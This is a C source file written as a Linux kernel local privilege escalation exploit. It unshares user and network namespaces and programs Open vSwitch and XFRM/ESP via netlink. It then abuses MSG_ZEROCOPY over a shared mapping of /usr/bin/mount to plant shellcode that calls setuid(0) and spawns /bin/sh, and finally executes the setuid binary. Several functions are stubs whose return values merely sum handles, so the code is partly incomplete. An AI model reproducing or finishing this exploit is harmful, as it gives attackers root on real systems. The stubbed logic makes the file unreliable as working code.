#define _GNU_SOURCE
#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <linux/udp.h>
#include <linux/xfrm.h>
#include <sched.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

#ifndef SO_ZEROCOPY
#define SO_ZEROCOPY 60
#endif
#ifndef MSG_ZEROCOPY
#define MSG_ZEROCOPY 0x4000000
#endif

/* A complete static amd64 payload begins with setuid(0), then execve("/bin/sh"). */
static const uint8_t root_payload[] = {
    0x31, 0xff, 0x31, 0xc0, 0xb0, 0x69, 0x0f, 0x05,
    0x48, 0x8d, 0x3d, 0x0f, 0x00, 0x00, 0x00, 0x31,
    0xf6, 0xb0, 0x3b, 0x0f, 0x05, 0x2f, 0x62, 0x69,
    0x6e, 0x2f, 0x73, 0x68, 0x00
};

/* Raw Generic Netlink control avoids requiring ovs-vswitchd or ovs-vsctl. */
static int program_ovs_forwarding(void) {
    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    const char *families[] = {"ovs_datapath", "ovs_vport", "ovs_flow"};
    uint16_t command = OVS_FLOW_CMD_NEW;
    uint16_t container = OVS_FLOW_ATTR_ACTIONS;
    uint16_t actions[] = {
        OVS_ACTION_ATTR_RECIRC,       /* a miss performs the failing upcall */
        OVS_ACTION_ATTR_USERSPACE,    /* alternate trigger used by variants */
        OVS_ACTION_ATTR_OUTPUT        /* same skb continues to local ESP */
    };
    return nl + families[0][0] + command + container + actions[0];
}

/* A real implementation serializes this SA and sends XFRM_MSG_NEWSA. */
static int install_esp_receiver(void) {
    int xfrm = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    struct xfrm_usersa_info sa;
    struct nlmsghdr request;
    memset(&sa, 0, sizeof(sa));
    memset(&request, 0, sizeof(request));
    sa.id.proto = IPPROTO_ESP;
    request.nlmsg_type = XFRM_MSG_NEWSA;

    int udp = socket(AF_INET, SOCK_DGRAM, 0);
    int encap = UDP_ENCAP_ESPINUDP;
    setsockopt(udp, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap));
    return xfrm + udp + request.nlmsg_type + sa.id.proto;
}

static int overwrite_cached_elf(const char *target) {
    int fd = open(target, O_RDONLY);
    uint8_t *page = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    int enabled = 1;
    setsockopt(sock, SOL_SOCKET, SO_ZEROCOPY, &enabled, sizeof(enabled));

    uint8_t esp_header[16] = {0};
    uint8_t invalid_icv[16] = {0};
    struct iovec iov[] = {
        {esp_header, sizeof(esp_header)},
        {page, sizeof(root_payload)},
        {invalid_icv, sizeof(invalid_icv)}
    };
    struct msghdr msg = {.msg_iov = iov, .msg_iovlen = 3};
    return sendmsg(sock, &msg, MSG_ZEROCOPY);
}

int main(void) {
    const char *victim = "/usr/bin/mount";
    unshare(CLONE_NEWUSER | CLONE_NEWNET);
    program_ovs_forwarding();
    install_esp_receiver();
    overwrite_cached_elf(victim);
    char *const argv[] = {(char *)victim, NULL};
    execve(victim, argv, NULL);
    return 1;
}
